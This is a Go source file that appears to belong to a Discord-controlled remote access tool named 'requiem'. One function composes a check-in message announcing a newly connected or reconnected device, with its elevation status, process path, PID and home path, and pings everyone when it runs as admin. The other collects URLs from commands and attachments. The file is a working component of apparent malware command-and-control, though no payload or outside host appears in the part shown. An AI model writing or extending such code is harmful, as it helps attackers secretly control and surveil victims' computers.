package discord

import (
	"fmt"
	"os"
	"regexp"

	"requiem/store"

	"shared"
)

func GetConnectionMsg(new bool) string {
	mention := "@here"
	if store.IsAdmin {
		mention = "@everyone"
	}

	message := "This device has reconnected."
	if new {
		message = "A new device has been connected."
	}

	trackingID := ""
	if store.TRACKING_ID != "" {
		trackingID = " - " + shared.DecryptConfig(store.TRACKING_ID)
	}

	version := fmt.Sprintf(
		"[%d.%d%s]",
		store.VERSION_UPDATE,
		store.VERSION_PATCH,
		trackingID,
	)

	info := fmt.Sprintf(
		"Elevated: %t\nProcess Path: %q\nProcess ID: %d\nHome Path: %q",
		store.IsAdmin,
		store.ExecPath,
		os.Getpid(),
		store.HomePath,
	)

	return fmt.Sprintf(
		"%s %s %s\n%s\nDo `%shelp` for a list of commands.",
		mention,
		message,
		version,
		info,
		store.COMMAND_PREFIX,
	)
}

func GetUrls(ctx *store.CommandContext) []string {
	var urls []string

	regex := regexp.MustCompile(`https?://[^\s]+`)

	matches := regex.FindAllString(ctx.Content, -1)
	urls = append(urls, matches...)

	for _, attachment := range ctx.Attachments {
		urls = append(urls, attachment.URL)
	}

	refrence := ctx.GetReferenceMsg()
	if refrence != nil {
		for _, attachment := range refrence.Attachments {
			urls = append(urls, attachment.URL)
		}

		matches := regex.FindAllString(refrence.Content, -1)
		urls = append(urls, matches...)
	}

	return urls
}
